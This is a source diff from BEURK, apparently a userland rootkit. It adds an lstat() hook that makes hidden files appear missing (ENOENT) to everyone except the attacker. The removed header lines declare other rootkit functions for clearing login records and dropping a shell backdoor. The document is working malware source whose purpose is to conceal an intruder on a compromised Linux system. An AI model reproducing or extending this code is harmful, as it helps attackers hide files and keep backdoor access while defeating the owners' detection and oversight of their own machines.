@@ -18,22 +18,22 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
+#include <sys/stat.h> /* struct stat */
+#include <errno.h> /* errno, ENOENT */
+#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_LSTAT() */
+#include "hooks.h" /* prototype */
 
-#include <sys/socket.h>
-#include "debug.h"
+int lstat(const char *path, struct stat *buf) {
+    DEBUG(D_INFO, "called lstat(3) hook");
 
-/* init.c */
-void        init(void) __attribute__((constructor));
+    if (is_attacker())
+        return (REAL_LSTAT(path, buf));
 
-/* is_attacker.c */
-int         is_attacker(void);
+    if (is_hidden_file(path)) {
+        errno = ENOENT;
+        return (-1);
+    }
 
-/* is_hidden_file.c */
-int         is_hidden_file(const char *path);
-
-/* cleanup_login_records.c */
-void        cleanup_login_records(const char *pty_name);
-
-/* drop_shell_backdoor.c */
-int         drop_shell_backdoor(int sock, struct sockaddr *addr);
+    return (REAL_LSTAT(path, buf));
+}
